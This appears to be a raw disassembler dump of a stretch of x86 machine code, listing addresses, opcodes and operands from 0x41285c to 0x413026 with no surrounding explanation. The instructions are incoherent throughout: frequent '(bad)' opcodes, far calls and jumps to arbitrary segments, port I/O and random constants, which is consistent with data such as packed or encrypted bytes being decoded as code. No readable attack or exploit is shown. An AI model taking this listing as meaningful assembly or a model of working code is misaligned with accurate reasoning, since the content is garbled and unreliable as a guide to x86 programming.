  41285c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41285d:	sbb    ebp,edi
  41285f:	sar    BYTE PTR ds:0x6fc13a29,cl
  412865:	jno    0x4128d3
  412867:	mov    ah,0x71
  412869:	into   
  41286a:	sbb    eax,0xc2ae7fff
  41286f:	retf   
  412870:	inc    edi
  412871:	lods   eax,DWORD PTR ds:[esi]
  412872:	not    DWORD PTR ds:0x7f7ecbd5
  412878:	push   ds
  412879:	add    DWORD PTR [edi-0x29daf1c7],ebx
  41287f:	mov    ebx,0x37e0ff77
  412884:	call   0x5bc2f68e
  412889:	adc    DWORD PTR [eax+ecx*8-0xe70f76],edx
  412890:	or     ebp,DWORD PTR [ecx]
  412892:	cdq    
  412893:	jb     0x4128d0
  412895:	stos   BYTE PTR es:[edi],al
  412896:	stos   BYTE PTR es:[edi],al
  412897:	xchg   edx,eax
  412898:	jge    0x41282f
  41289a:	jnp    0x412891
  41289c:	jge    0x412907
  41289e:	mov    ebp,0x52ae9a14
  4128a3:	push   0x74161085
  4128a8:	and    al,0x30
  4128aa:	int3   
  4128ab:	addr16 xor al,0x3d
  4128ae:	bound  edi,QWORD PTR [di]
  4128b1:	(bad)  
  4128b2:	loopne 0x4128b1
  4128b4:	sub    ecx,DWORD PTR [esi-0x23816721]
  4128ba:	iret   
  4128bb:	js     0x412918
  4128bd:	rol    BYTE PTR [edi+0x6fa96c8e],0xe6
  4128c4:	call   0x7d992376
  4128c9:	cmp    BYTE PTR [ebx-0x68],0xee
  4128cd:	(bad)  
  4128cf:	jmp    0x412872
  4128d1:	sbb    edx,DWORD PTR [ecx-0x4f229e6d]
  4128d7:	inc    ebp
  4128d8:	and    BYTE PTR [eiz*1-0x97e84b1],dh
  4128df:	add    dh,bl
  4128e1:	retf   0x24c0
  4128e4:	sub    BYTE PTR [ebx+0xaaf9176],bh
  4128ea:	clc    
  4128eb:	dec    eax
  4128ec:	push   esp
  4128ed:	ds in  al,0xeb
  4128f0:	mov    dh,0x40
  4128f2:	xor    DWORD PTR [edi],esp
  4128f4:	or     DWORD PTR [edx-0x5145e48],0x5a
  4128fb:	es stos DWORD PTR es:[edi],eax
  4128fd:	stc    
  4128fe:	pop    ebx
  4128ff:	test   ax,0xa50
  412903:	adc    bl,BYTE PTR [edi]
  412905:	imul   ah
  412907:	cld    
  412908:	mov    bl,0xe0
  41290a:	jg     0x412980
  41290c:	jp     0x4128d7
  41290e:	xchg   edx,eax
  41290f:	fistp  QWORD PTR [edx+ebx*2]
  412912:	call   0x991:0x6062f088
  412919:	pop    es
  41291a:	mov    WORD PTR [edi-0x3fb1a151],?
  412920:	mov    ah,0x91
  412922:	fsubr  st(1),st
  412924:	and    cl,dh
  412926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412927:	inc    ebp
  412928:	in     al,dx
  412929:	popf   
  41292a:	xor    ah,ch
  41292c:	dec    edx
  41292d:	rep stos DWORD PTR es:[edi],eax
  41292f:	pop    eax
  412930:	jp     0x41296a
  412932:	bound  edi,QWORD PTR [edx]
  412934:	rcr    ah,0xe5
  412937:	jno    0x41291f
  412939:	inc    ebp
  41293a:	xor    esi,DWORD PTR [esi+0x1574674c]
  412940:	push   eax
  412941:	inc    ebp
  412942:	lea    esi,[eax]
  412944:	xor    eax,0x4c96d915
  412949:	imul   edx,eax,0xb4cf0a4a
  41294f:	inc    esi
  412950:	fist   DWORD PTR ds:0xe27559d2
  412956:	or     DWORD PTR [esi+edx*8+0x0],0xe954c937
  41295e:	ins    BYTE PTR es:[edi],dx
  41295f:	les    esp,FWORD PTR [ebx]
  412961:	pop    eax
  412962:	cmp    BYTE PTR [esi-0x15],al
  412965:	mov    ch,0xa6
  412967:	xor    al,0xca
  412969:	hlt    
  41296a:	aas    
  41296b:	lock popa 
  41296d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41296e:	rol    BYTE PTR ds:[edx+0x1d],1
  412972:	add    BYTE PTR [eax+0x10],bl
  412975:	push   esi
  412976:	pop    ebx
  412977:	jo     0x412961
  412979:	gs xor eax,0x13237d7
  41297f:	and    ebp,DWORD PTR [ebx-0x3c]
  412982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412983:	cld    
  412984:	sbb    ebx,eax
  412986:	inc    edi
  412987:	js     0x4129e6
  412989:	pushf  
  41298a:	aas    
  41298b:	test   al,0xef
  41298d:	retf   0xb2a6
  412990:	mov    edi,0x7073959c
  412995:	out    0x32,al
  412997:	xchg   ecx,eax
  412998:	ss xchg ebp,eax
  41299a:	popf   
  41299b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299c:	or     eax,0xd0789e62
  4129a1:	ret    
  4129a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129a3:	shr    DWORD PTR [ebx+0x632cb76e],cl
  4129a9:	test   dh,bh
  4129ab:	adc    BYTE PTR [edx-0x34],0x1e
  4129af:	push   0x33
  4129b1:	iret   
  4129b2:	add    DWORD PTR [esi-0x19],ebx
  4129b5:	cmp    eax,0x8a6433cc
  4129ba:	inc    ecx
  4129bb:	xchg   ecx,eax
  4129bc:	push   edi
  4129bd:	pop    edi
  4129be:	div    DWORD PTR [esi]
  4129c0:	cmp    al,0x87
  4129c2:	inc    edx
  4129c3:	aam    0xeb
  4129c5:	or     eax,0x4a596257
  4129ca:	push   ebp
  4129cb:	xchg   ebx,eax
  4129cc:	es sub al,0x85
  4129cf:	es pop esp
  4129d1:	adc    ch,BYTE PTR [ebx-0x51]
  4129d4:	xchg   ah,cl
  4129d6:	test   DWORD PTR [eax],esp
  4129d8:	fwait
  4129d9:	add    eax,DWORD PTR [ebp-0x75]
  4129dc:	dec    edx
  4129dd:	mov    ah,0xf4
  4129df:	mov    bl,0x7f
  4129e1:	dec    ebx
  4129e2:	ret    
  4129e3:	aad    0xf2
  4129e5:	sahf   
  4129e6:	inc    esp
  4129e7:	gs call 0xe42ab9a0
  4129ed:	and    BYTE PTR [esi+0x405219e0],0x3b
  4129f4:	(bad)  
  4129f5:	(bad)  
  4129f6:	pop    ebx
  4129f7:	imul   BYTE PTR [edx-0x41]
  4129fa:	(bad)  
  4129fb:	outs   dx,DWORD PTR ds:[esi]
  4129fc:	cmp    DWORD PTR [ecx+0x67],ecx
  4129ff:	lds    edx,FWORD PTR [ebp-0x1171bac5]
  412a05:	call   0xba607007
  412a0a:	xchg   BYTE PTR [esi],bh
  412a0c:	nop
  412a0d:	jo     0x412a36
  412a0f:	mov    al,0xa2
  412a11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a12:	or     DWORD PTR [esi-0x356f4d3b],ebp
  412a18:	ss in  eax,0x95
  412a1b:	mov    edx,0x1955aa2
  412a20:	ins    DWORD PTR es:[edi],dx
  412a21:	scas   al,BYTE PTR es:[edi]
  412a22:	inc    ebx
  412a23:	bound  ebp,QWORD PTR ds:0xdadb4c6e
  412a29:	loope  0x4129e1
  412a2b:	xchg   DWORD PTR [ecx+ebp*1-0x13],esp
  412a2f:	add    BYTE PTR [edx-0x30b31636],0xa8
  412a36:	mov    edx,0xf8d39c70
  412a3b:	loop   0x412a12
  412a3d:	or     ebp,DWORD PTR [esi]
  412a3f:	fldenv [ecx]
  412a41:	sbb    eax,0xe9a1355b
  412a46:	es jl  0x412aac
  412a49:	xlat   BYTE PTR ds:[ebx]
  412a4a:	sub    BYTE PTR [eax+0x2687797e],ch
  412a50:	(bad)  
  412a51:	adc    DWORD PTR [edx-0x2b],ecx
  412a54:	gs dec ebp
  412a56:	xchg   BYTE PTR ds:0x7e569f41,dl
  412a5c:	pop    es
  412a5d:	dec    ebp
  412a5e:	popf   
  412a5f:	jp     0x412ab9
  412a61:	aad    0x58
  412a63:	sar    DWORD PTR [ecx-0x3317bbe3],0xf9
  412a6a:	add    eax,0x735114fb
  412a6f:	popa   
  412a70:	cmp    BYTE PTR [ecx+0x17f4805b],al
  412a76:	xchg   esp,eax
  412a77:	push   cs
  412a78:	enter  0x74e5,0xb5
  412a7c:	adc    BYTE PTR [edx],bl
  412a7e:	lods   al,BYTE PTR ds:[esi]
  412a7f:	jns    0x412a7a
  412a81:	dec    edx
  412a82:	in     eax,0x9
  412a84:	inc    eax
  412a85:	call   0xa24eea0b
  412a8a:	inc    esp
  412a8b:	push   edi
  412a8c:	jbe    0x412a27
  412a8e:	jno    0x412a6f
  412a90:	inc    eax
  412a91:	or     edx,DWORD PTR [ebx-0x17de618d]
  412a97:	neg    DWORD PTR [edx+0x4205a875]
  412a9d:	and    al,0xfa
  412a9f:	sbb    esp,DWORD PTR [ebp-0x16f28186]
  412aa5:	sahf   
  412aa6:	lock cmp eax,0x2f01afb7
  412aac:	mov    bh,0x0
  412aae:	lds    ebx,FWORD PTR [ecx]
  412ab0:	add    DWORD PTR [ecx+0x46],0xf1f78048
  412ab7:	inc    esi
  412ab8:	dec    edx
  412ab9:	adc    eax,0x6ce22629
  412abe:	fcomip st,st(3)
  412ac0:	std    
  412ac1:	xor    al,0xdc
  412ac3:	cmp    al,0x1c
  412ac5:	push   0x3fd790a6
  412aca:	fsub   QWORD PTR [edi-0x2e2c9a37]
  412ad0:	mov    dl,0xba
  412ad2:	push   0x393e2b29
  412ad7:	mov    edx,0xc35c52d8
  412adc:	mov    eax,0x4a5faea3
  412ae1:	shl    BYTE PTR [ecx+0x6c8a8901],0xa5
  412ae8:	push   es
  412ae9:	mov    dh,0x61
  412aeb:	js     0x412a77
  412aed:	add    eax,0xfe3eb394
  412af2:	mov    ds:0x624b71e,eax
  412af7:	or     DWORD PTR [eax+0x4],0x6
  412afb:	call   0x860f4f5b
  412b00:	jno    0x412ad1
  412b02:	pshufw mm3,mm4,0x5c
  412b06:	les    edx,FWORD PTR ds:0xca8eeccd
  412b0c:	test   DWORD PTR [edx+0xa5abf89],ebp
  412b12:	idiv   ecx
  412b14:	fist   DWORD PTR [ebx]
  412b16:	call   0xb5b4:0x5c8a9f
  412b1d:	mulps  xmm4,XMMWORD PTR [eax]
  412b20:	push   esp
  412b21:	fadd   DWORD PTR [esi]
  412b23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b24:	repnz xor DWORD PTR [ecx-0x2f],ecx
  412b28:	sbb    BYTE PTR [ebx+0x3a],0x34
  412b2c:	ret    0x14e2
  412b2f:	fs call 0xd3cc:0x158fc9fd
  412b37:	aad    0x7c
  412b39:	out    0x4c,al
  412b3b:	sub    eax,0xe5c455d1
  412b40:	test   eax,0xc6bcad84
  412b45:	es pop edx
  412b47:	(bad)  
  412b48:	cmp    bl,BYTE PTR [esp+ebp*2+0x294eccc5]
  412b4f:	ret    0xcdbc
  412b52:	push   cs
  412b53:	fild   WORD PTR [esi+0xfa396a9]
  412b59:	ffreep st(6)
  412b5b:	int3   
  412b5c:	inc    BYTE PTR [edi-0xf]
  412b5f:	jmp    0x412b9a
  412b61:	stos   BYTE PTR es:[edi],al
  412b62:	ror    DWORD PTR [ecx-0x35b67695],cl
  412b68:	int    0xb8
  412b6a:	xlat   BYTE PTR ds:[ebx]
  412b6b:	mov    eax,ds:0x35a4f9dc
  412b70:	ficom  WORD PTR [edx+0x23]
  412b73:	mov    ecx,0x7aeee4c1
  412b78:	xchg   ecx,eax
  412b79:	push   0x3047daa
  412b7e:	test   BYTE PTR [ecx+0x15],cl
  412b81:	iret   
  412b82:	shl    bh,0x38
  412b85:	inc    esp
  412b86:	mov    ebx,0x76ac8b3d
  412b8b:	pop    ebx
  412b8c:	aad    0x79
  412b8e:	nop
  412b8f:	lods   eax,DWORD PTR ds:[esi]
  412b90:	shr    DWORD PTR [edx+0x55],cl
  412b93:	mov    edx,0xe994f242
  412b98:	sbb    DWORD PTR [esi+0x79417ac5],esp
  412b9e:	ret    
  412b9f:	and    ecx,DWORD PTR [ecx-0xb]
  412ba2:	iret   
  412ba3:	push   eax
  412ba4:	ins    DWORD PTR es:[edi],dx
  412ba5:	sahf   
  412ba6:	add    eax,0x8a636342
  412bab:	stc    
  412bac:	popa   
  412bad:	adc    al,0xee
  412baf:	mov    dh,BYTE PTR [ecx-0x4f]
  412bb2:	xlat   BYTE PTR ds:[ebx]
  412bb3:	xchg   BYTE PTR [edx+esi*1],cl
  412bb6:	mov    al,0x89
  412bb8:	xchg   DWORD PTR ds:0x19d0f75f,ebx
  412bbe:	popa   
  412bbf:	cmp    BYTE PTR [edi],bl
  412bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bc2:	or     eax,0x58288ed7
  412bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bc8:	leave  
  412bc9:	push   0xffffffb0
  412bcb:	into   
  412bcc:	sub    bl,BYTE PTR [edi]
  412bce:	sbb    edi,DWORD PTR [ecx+0x34]
  412bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bd2:	adc    ebx,DWORD PTR [ecx+0x2be77b06]
  412bd8:	repz ss mov ebp,0xb32dc47b
  412bdf:	mov    eax,ds:0x3c755737
  412be4:	mov    ah,0x7f
  412be6:	stos   BYTE PTR es:[edi],al
  412be7:	rol    DWORD PTR [ecx],0xf
  412bea:	mov    ecx,0xdcf984ef
  412bef:	mov    cs,WORD PTR [edx+0x2e21386c]
  412bf5:	test   al,0x8b
  412bf7:	rol    BYTE PTR [ebp-0x31],0xfc
  412bfb:	cdq    
  412bfc:	mov    al,0xd9
  412bfe:	adc    al,0xa5
  412c00:	push   ebx
  412c01:	je     0x412c32
  412c03:	adc    edx,eax
  412c05:	jne    0x412bc7
  412c07:	xchg   DWORD PTR [edi-0x7c467795],eax
  412c0d:	mov    eax,0xd2c92589
  412c12:	xor    dl,BYTE PTR [edi+0x1f]
  412c15:	jle    0x412c74
  412c17:	push   cs
  412c18:	or     ebp,DWORD PTR [edi+edx*8-0x16]
  412c1c:	dec    edi
  412c1d:	stc    
  412c1e:	or     BYTE PTR [esi],ah
  412c20:	cmp    al,0x14
  412c22:	and    al,0x8a
  412c24:	add    eax,0xbc0905eb
  412c29:	dec    ecx
  412c2a:	daa    
  412c2b:	pop    ebp
  412c2c:	inc    esp
  412c2d:	and    eax,0xe4e95a54
  412c32:	cmp    BYTE PTR [edx-0x3c],0x4b
  412c36:	outs   dx,BYTE PTR ds:[esi]
  412c37:	inc    ebp
  412c38:	inc    ebp
  412c39:	rol    BYTE PTR [ebx-0x6],0x27
  412c3d:	and    esi,DWORD PTR [ebx+0x7a]
  412c40:	or     al,0xef
  412c42:	(bad)  
  412c43:	jns    0x412c3a
  412c45:	mov    ds:0xd24e8e2c,al
  412c4a:	pop    edi
  412c4b:	out    dx,eax
  412c4c:	mov    ebp,ecx
  412c4e:	sub    DWORD PTR [eax-0x11],0x42bfef38
  412c55:	mov    al,ds:0xd4857005
  412c5a:	rcr    DWORD PTR [ecx],1
  412c5c:	mov    ebx,0x8721709d
  412c61:	mov    eax,ds:0xd61418de
  412c66:	jle    0x412bec
  412c68:	jmp    0xc769:0x6bc74959
  412c6f:	add    ch,BYTE PTR [ebp-0x32635a23]
  412c75:	inc    ecx
  412c76:	dec    eax
  412c77:	daa    
  412c78:	int3   
  412c79:	retf   0x2c8c
  412c7c:	pop    edi
  412c7d:	dec    ebp
  412c7e:	cmp    esi,DWORD PTR [eax+0x30]
  412c81:	mov    ecx,0x4e454ba5
  412c86:	(bad)  
  412c88:	les    ecx,FWORD PTR [eiz*2-0x544ebf16]
  412c8f:	retf   
  412c90:	cmp    DWORD PTR [ebx-0x40],esp
  412c93:	inc    eax
  412c94:	js     0x412c3b
  412c96:	cld    
  412c97:	mov    BYTE PTR [ebx+ecx*8+0x1b],cl
  412c9b:	clc    
  412c9c:	or     BYTE PTR [ebx+0x0],cl
  412c9f:	fwait
  412ca0:	call   0xd2ca:0x7017f104
  412ca7:	repz fild DWORD PTR [edx]
  412caa:	cmc    
  412cab:	test   DWORD PTR [edx+0x7a],esp
  412cae:	jmp    0x3863:0xf3bfa8e5
  412cb5:	jae    0x412c79
  412cb7:	mov    esi,0xcee9ce7a
  412cbc:	ficom  WORD PTR [ebp+0xd]
  412cbf:	inc    edi
  412cc0:	leave  
  412cc1:	into   
  412cc2:	mov    al,0x78
  412cc4:	cmp    BYTE PTR [edx],bh
  412cc6:	je     0x412d34
  412cc8:	loopne 0x412c53
  412cca:	push   edx
  412ccb:	je     0x412d3a
  412ccd:	enter  0xb7b1,0xed
  412cd1:	std    
  412cd2:	inc    ebp
  412cd3:	js     0x412d37
  412cd5:	xchg   edx,eax
  412cd6:	adc    ebx,eax
  412cd8:	(bad)  
  412cda:	push   edx
  412cdb:	mov    al,ds:0xc1946a0b
  412ce0:	cwde   
  412ce1:	ret    0x3407
  412ce4:	jl     0x412cda
  412ce6:	jmp    0xb1634b8e
  412ceb:	dec    edx
  412cec:	push   ecx
  412ced:	jmp    0x412cf9
  412cef:	or     al,0x60
  412cf1:	sub    DWORD PTR fs:[esi],esi
  412cf4:	not    BYTE PTR [eax]
  412cf6:	test   BYTE PTR [edi+0x5ccaec72],ah
  412cfc:	dec    ebp
  412cfd:	add    al,0x14
  412cff:	xchg   edx,eax
  412d00:	rol    DWORD PTR [edx-0x78],1
  412d03:	or     eax,0x8cadd377
  412d08:	sub    edx,esi
  412d0a:	mov    dl,bh
  412d0c:	dec    edi
  412d0d:	test   DWORD PTR [edx-0x18bef7cd],ecx
  412d13:	jge    0x412cc1
  412d15:	mov    WORD PTR [ecx+ebx*4+0x100ce9f5],es
  412d1c:	xchg   edx,eax
  412d1d:	dec    edx
  412d1e:	lds    edx,FWORD PTR [edx-0x29]
  412d21:	sbb    al,0xca
  412d23:	mov    ch,0x94
  412d25:	cdq    
  412d26:	push   cs
  412d27:	cmc    
  412d28:	jmp    0x7b43:0x14edc494
  412d2f:	(bad)  
  412d30:	pushf  
  412d31:	inc    ebp
  412d32:	sahf   
  412d33:	mov    ebp,0x727bb615
  412d38:	mov    ebp,0x5e0382f3
  412d3d:	jne    0x412cf1
  412d3f:	(bad)  
  412d40:	cmc    
  412d41:	dec    esi
  412d42:	(bad)  [ecx-0x76ade13a]
  412d48:	xchg   ebx,eax
  412d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d4a:	xchg   ebp,eax
  412d4b:	mov    cl,0x83
  412d4d:	test   DWORD PTR [eax],ebx
  412d4f:	retf   
  412d50:	nop
  412d51:	sbb    al,0xb8
  412d53:	xor    dl,bl
  412d55:	leave  
  412d56:	push   eax
  412d57:	lahf   
  412d58:	xor    bh,BYTE PTR [esi-0x13004020]
  412d5e:	ficomp WORD PTR [ecx+0x64]
  412d61:	push   es
  412d62:	mov    esp,0x3725086
  412d67:	mov    edx,0x7679ccd3
  412d6c:	mov    ds:0x6edb580b,al
  412d71:	jno    0x412d3c
  412d73:	cld    
  412d74:	cli    
  412d75:	dec    ebx
  412d76:	aaa    
  412d77:	jp     0x412d0c
  412d79:	push   eax
  412d7a:	cwde   
  412d7b:	rcr    BYTE PTR [eax+0xc],cl
  412d7e:	xchg   ebx,eax
  412d7f:	pop    es
  412d80:	test   bl,dl
  412d82:	icebp  
  412d83:	push   edx
  412d84:	jb     0x412e05
  412d86:	mov    ah,0x14
  412d88:	add    al,0xdd
  412d8a:	test   al,0xdb
  412d8c:	fdiv   QWORD PTR [ecx]
  412d8e:	fstp   TBYTE PTR [esi]
  412d90:	xor    DWORD PTR [edx+0x7c69388f],esp
  412d96:	fnstsw ax
  412d98:	addr16 stc 
  412d9a:	call   0x88bffc2e
  412d9f:	push   eax
  412da0:	adc    dh,BYTE PTR [eax-0x20]
  412da3:	or     DWORD PTR [eax+0x2b1d2585],0x57660a2
  412dad:	pop    eax
  412dae:	sub    BYTE PTR [ecx-0x74],bh
  412db1:	aaa    
  412db2:	push   es
  412db3:	jno    0x412e01
  412db5:	mov    bh,0x69
  412db7:	cmp    BYTE PTR [ebx-0xd5151ea],dh
  412dbd:	stc    
  412dbe:	dec    ebp
  412dbf:	mov    cl,0x81
  412dc1:	loopne 0x412d99
  412dc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dc4:	repz and BYTE PTR [eax],bh
  412dc7:	ror    dl,cl
  412dc9:	cmp    eax,0xe4192e89
  412dce:	xor    esp,DWORD PTR cs:[esi]
  412dd1:	push   0xf35fbe38
  412dd6:	push   edx
  412dd7:	and    ecx,DWORD PTR [esi]
  412dd9:	push   edx
  412dda:	push   0x1d
  412ddc:	mov    al,dl
  412dde:	inc    esi
  412ddf:	out    0x4a,al
  412de1:	imul   dh
  412de3:	sub    eax,DWORD PTR [esp+eiz*8]
  412de6:	sub    al,0xfb
  412de8:	test   BYTE PTR [edi],bh
  412dea:	mov    bl,0xa6
  412dec:	and    ebp,ebp
  412dee:	ss mov ecx,0x6c487d0
  412df4:	sub    eax,0xa9703ff6
  412df9:	ret    
  412dfa:	dec    edx
  412dfb:	fdivp  st(2),st
  412dfd:	std    
  412dfe:	dec    ebp
  412dff:	repz scas eax,DWORD PTR es:[edi]
  412e01:	jnp    0x412de1
  412e03:	jle    0x412e77
  412e05:	sbb    ax,WORD PTR [ebp-0x76]
  412e09:	mov    ch,0xe5
  412e0b:	sbb    eax,0x18dedf4f
  412e10:	ficom  WORD PTR [esi+0x362bdc1f]
  412e16:	jae    0x412d9c
  412e18:	shl    BYTE PTR [edx-0x58bfa2ef],0xf4
  412e1f:	test   al,0xcf
  412e21:	inc    ecx
  412e22:	push   ds
  412e23:	cmp    eax,0xb436ebbe
  412e28:	mov    ch,0xbb
  412e2a:	(bad)  
  412e2b:	not    ecx
  412e2d:	pop    edx
  412e2e:	inc    edi
  412e2f:	pusha  
  412e30:	jmp    0x412de4
  412e32:	cmp    ecx,esi
  412e34:	mov    dl,0x59
  412e36:	outs   dx,DWORD PTR ds:[esi]
  412e37:	xchg   ebp,eax
  412e38:	stos   DWORD PTR es:[edi],eax
  412e39:	cmp    ecx,DWORD PTR [edi-0x3]
  412e3c:	sbb    ah,BYTE PTR [edi+0x23dd974]
  412e42:	inc    ebp
  412e43:	push   ds
  412e44:	mul    BYTE PTR [eax]
  412e46:	packssdw mm4,QWORD PTR [eax+0x22]
  412e4a:	stos   DWORD PTR es:[edi],eax
  412e4b:	and    esp,esp
  412e4d:	or     BYTE PTR [esi],cl
  412e4f:	and    bh,BYTE PTR [ebx+0x106d6630]
  412e55:	ds push 0x86489ea3
  412e5b:	dec    edi
  412e5c:	hlt    
  412e5d:	sub    BYTE PTR [ebx-0x61],ah
  412e60:	aam    0x4e
  412e62:	pop    esp
  412e63:	inc    edx
  412e64:	sbb    al,0xd5
  412e66:	and    BYTE PTR [edi+0x6a75bc0f],cl
  412e6c:	loopne 0x412e83
  412e6e:	jl     0x412e5b
  412e70:	inc    ebp
  412e71:	cs dec ebp
  412e73:	cdq    
  412e74:	pop    ebx
  412e75:	int3   
  412e76:	cs ss mov ebx,0x78736f94
  412e7d:	rcl    DWORD PTR [eax+0x63],1
  412e80:	js     0x412ecc
  412e82:	iret   
  412e83:	mov    ch,0xc1
  412e85:	cmp    DWORD PTR [ecx+0x3c],ecx
  412e88:	in     al,0x2b
  412e8a:	or     al,0xc5
  412e8c:	sbb    eax,0x84050ad3
  412e91:	push   esp
  412e92:	pop    ds
  412e93:	nop
  412e94:	adc    eax,0x2aa8ce8e
  412e99:	mov    WORD PTR [eax-0x1a],?
  412e9c:	push   eax
  412e9d:	popf   
  412e9e:	cmp    eax,0x231c67ff
  412ea3:	mov    ds,WORD PTR [eax-0x3f]
  412ea6:	or     eax,DWORD PTR [ecx-0x7c]
  412ea9:	xor    esp,DWORD PTR [edi-0x38]
  412eac:	and    BYTE PTR [ebp-0x21],0xfc
  412eb0:	jb     0x412ee8
  412eb2:	(bad)  [eax-0x13]
  412eb5:	es retf 
  412eb7:	xchg   edx,eax
  412eb8:	push   cs
  412eb9:	cwde   
  412eba:	int    0xcc
  412ebc:	loopne 0x412ef7
  412ebe:	imul   edx,DWORD PTR [ebp+edi*4+0x363cdc2d],0x6a
  412ec6:	stos   DWORD PTR es:[edi],eax
  412ec7:	cdq    
  412ec8:	lds    eax,FWORD PTR [ecx+0x1b]
  412ecb:	sbb    ebx,esi
  412ecd:	inc    esp
  412ece:	mov    bh,0x96
  412ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ed1:	mov    esp,0x70fe23cd
  412ed6:	mov    al,ds:0xaf442e17
  412edb:	shl    bh,cl
  412edd:	or     edx,DWORD PTR [esi+0x4e432108]
  412ee3:	xor    al,0x9d
  412ee5:	jp     0x412f60
  412ee7:	fidiv  DWORD PTR ds:0x1105a5fb
  412eed:	nop
  412eee:	mov    esp,0x487076c0
  412ef3:	scas   eax,DWORD PTR es:[edi]
  412ef4:	jo     0x412f55
  412ef6:	jns    0x412f2d
  412ef8:	inc    ecx
  412ef9:	lds    edx,FWORD PTR [edi+0x27295711]
  412eff:	cli    
  412f00:	mov    edx,DWORD PTR ds:0x49858ccf
  412f06:	out    0x76,al
  412f08:	adc    eax,0x83adef20
  412f0d:	sub    al,0xb5
  412f0f:	popf   
  412f10:	bound  eax,QWORD PTR [esi]
  412f12:	stc    
  412f13:	xchg   ecx,eax
  412f14:	mov    ecx,0xdecd852a
  412f19:	mov    WORD PTR [ecx],es
  412f1b:	daa    
  412f1c:	xor    al,ch
  412f1e:	add    edx,DWORD PTR [ecx]
  412f20:	in     al,0x8
  412f22:	jmp    0x4c6:0x8241cf1e
  412f29:	loope  0x412f95
  412f2b:	lock ins DWORD PTR es:[edi],dx
  412f2d:	push   eax
  412f2e:	xchg   esi,eax
  412f2f:	daa    
  412f30:	dec    ebp
  412f31:	jnp    0x412ee7
  412f33:	in     al,0x72
  412f35:	dec    edi
  412f36:	jecxz  0x412f00
  412f38:	aad    0x7
  412f3a:	sbb    DWORD PTR [edx-0x35ccacb4],esi
  412f40:	push   edi
  412f41:	bound  edi,QWORD PTR [edi]
  412f43:	das    
  412f44:	fwait
  412f45:	nop
  412f46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f47:	mov    ecx,ecx
  412f49:	inc    ebp
  412f4a:	daa    
  412f4b:	data16 mov dh,BYTE PTR [ebx-0x200995b1]
  412f52:	xchg   edi,eax
  412f53:	dec    eax
  412f54:	ret    
  412f55:	pop    ebx
  412f56:	fdecstp 
  412f58:	ss inc ebx
  412f5a:	test   bh,0x5
  412f5d:	sbb    al,0x40
  412f5f:	cmp    esp,esp
  412f61:	stc    
  412f62:	imul   edx,DWORD PTR [eax],0xa06cc5d4
  412f68:	shl    BYTE PTR [edi],0xbd
  412f6b:	leave  
  412f6c:	inc    ebp
  412f6d:	mov    edi,0xddb77b8f
  412f72:	pop    ebx
  412f73:	arpl   WORD PTR [edi-0x1b],cx
  412f76:	mov    dh,0x61
  412f78:	xchg   ebp,eax
  412f79:	pusha  
  412f7a:	push   esi
  412f7b:	cwde   
  412f7c:	and    DWORD PTR [esi],0x6748f371
  412f82:	mul    BYTE PTR [ecx+0x11]
  412f85:	mov    ebp,edx
  412f87:	not    dh
  412f89:	and    bh,BYTE PTR [esp+eiz*8-0x39fc8f31]
  412f90:	inc    edi
  412f91:	xchg   edx,eax
  412f92:	scas   eax,DWORD PTR es:[edi]
  412f93:	or     bl,BYTE PTR [esp+edi*1]
  412f96:	dec    edx
  412f97:	inc    ebp
  412f98:	jl     0x412f2c
  412f9a:	aad    0x79
  412f9c:	ds dec esp
  412f9e:	jmp    0x412ffc
  412fa0:	mov    bl,BYTE PTR [edx-0x33]
  412fa3:	(bad)  
  412fa4:	div    esi
  412fa6:	push   ds
  412fa7:	stc    
  412fa8:	dec    edx
  412fa9:	rcl    dh,cl
  412fab:	and    BYTE PTR [edi+0x1e79806a],0x5
  412fb2:	xchg   BYTE PTR [esi+eiz*1-0xb],bh
  412fb6:	in     eax,dx
  412fb7:	mov    ch,0xf4
  412fb9:	adc    DWORD PTR [esi+ebx*1],eax
  412fbc:	mov    es,WORD PTR [ebp+0xb]
  412fbf:	push   ebp
  412fc0:	aaa    
  412fc1:	loopne 0x412ff7
  412fc3:	call   0x138193b
  412fc8:	push   edi
  412fc9:	adc    DWORD PTR [edi-0x7317f59a],eax
  412fcf:	lods   al,BYTE PTR ds:[esi]
  412fd0:	pop    sp
  412fd2:	and    BYTE PTR ds:0xad18dc8a,ch
  412fd8:	fcom   QWORD PTR [esi]
  412fda:	mov    bh,0xcb
  412fdc:	ror    bh,1
  412fde:	imul   edx,ecx,0x9be387a4
  412fe4:	loop   0x413031
  412fe6:	push   ebx
  412fe7:	hlt    
  412fe8:	test   BYTE PTR [esi],bh
  412fea:	pop    esp
  412feb:	cwde   
  412fec:	and    al,0x36
  412fee:	out    dx,eax
  412fef:	mov    bl,0xa4
  412ff1:	fcmovu st,st(1)
  412ff3:	push   ebx
  412ff4:	pand   mm6,QWORD PTR [ebp+0x30]
  412ff8:	dec    ebp
  412ff9:	add    al,0x52
  412ffb:	fwait
  412ffc:	adc    ebp,DWORD PTR [ebx+ebp*4]
  412fff:	add    bl,BYTE PTR [ecx]
  413001:	pop    esp
  413002:	sub    DWORD PTR [ebx],0xffffffe2
  413005:	xor    al,0x54
  413007:	xchg   ecx,eax
  413008:	cwde   
  413009:	cli    
  41300a:	and    ah,cl
  41300c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41300d:	popf   
  41300e:	or     eax,0xdcb910be
  413013:	aas    
  413014:	jne    0x412fa4
  413016:	dec    esp
  413017:	(bad)  
  413018:	call   DWORD PTR [ecx+edi*4+0x0]
  41301c:	repz ja 0x41306f
  41301f:	(bad)  
  413020:	loop   0x41305b
  413022:	lock cdq 
  413024:	nop
  413025:	(bad)  
  413026:	(bad)  
